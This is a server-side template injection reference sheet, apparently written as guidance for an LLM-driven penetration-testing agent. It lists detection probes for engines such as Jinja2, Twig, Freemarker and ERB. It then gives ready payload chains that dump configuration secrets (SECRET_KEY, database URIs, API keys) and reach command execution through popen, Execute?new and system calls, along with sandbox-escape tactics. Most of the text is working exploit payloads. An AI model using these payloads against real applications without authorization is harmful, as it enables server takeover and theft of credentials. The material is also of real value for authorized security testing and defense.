# SSTI Reference

## Engine detection matrix (one request each)
| Engine | Detector | Signal in response |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` | `49` |
| Jinja2 | `{{config}}` / `{{self.__init__.__globals__}}` | dict dump |
| Jinja2 sandbox probe | `{{''.__class__}}` | `<class 'str'>` |
| Mako (Python) | `${7*7}` | `49` |
| Django template | `{{7*7}}` | **`0`** (Django renders 0, not 49 — the tell) |
| Twig (PHP) | `{{7*7}}` | `49` |
| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}` (confirm only after 49) | exec |
| Freemarker (Java) | `${7*7}` | `49` |
| Freemarker | `${"freemarker.template.utility.Execute"?new()("id")}` | uid output |
| Velocity (Java) | `$_velocityUtils.chr(99)` / `#set($x=$stats)${x}` | object dumps |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| EJS/Handlebars (JS) | `<%= 7*7 %>` / `{{7*7}}` | `49` |
| Thymeleaf (Java) | `${7*7}` | `49` |

**First two requests decide the engine.** Do not spray all engines at every point —
detect, then go deep on the detected engine.

## Object-graph walking (per detected engine)
Goal: reach config / env / command execution. Walk one level at a time; each level's
**actual output** is the input for the next (never assume).

### Jinja2 → config → env
1. `{{config}}` → SECRET_KEY, SQLALCHEMY_DATABASE_URI, API keys (record as facts)
2. `{{config.items()}}`
3. `{{self.__init__.__globals__}}` → module scope
4. `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` → RCE
5. sandbox variants: `{{cycler.__init__.__globals__['os'].popen('id').read()}}`,
   `{{lipsum.__init__.__globals__['os']...}}`, `{{request.environ}}` (Werkzeug env: keys, REMOTE_ADDR)
6. `{{request.args}}` / `{{request.headers}}` — confirms request object access

### Twig → exec
1. `{{_self.env.get_functions()}}` → function list
2. `{{_self.env.registerUndefinedFilterCallback("exec")}}{{('',?)}}` (confirm-only)
3. `{{['id']|map('exec')}}` style if `map`+callable allowed
4. `{{dump(_self)}}` → environment dump

### Freemarker → RCE
1. `${.data['?new']("freemarker.template.utility.Execute")["?new"]("id")}` (2.3.x)
2. `${"freemarker.template.utility.Execute"?new()("id")}` (older)
3. object-browser leak: `${.new_builtins?keys}` — record version signals

### ERB → RCE
1. `<%= RUBY_VERSION %>` → version
2. `<%= system("id") %>` → RCE (rails console access often via `<%= ENV %>` first — record)

## Sandbox escape doctrine
- Every `__globals__`/`__init__`/`__class__` hop is one LLM turn: record each level's output
  as you go (a fact per significant hop), because compaction eats the trail.
- If level N dies (sandbox blocks), try 2–3 alternate attributes at that level before
  giving up the engine (different objects expose different globals).
- A config dump alone (no exec) is still a P1/P2 finding: record the secrets found,
  report as "SSTI leading to sensitive information disclosure" with the config evidence.
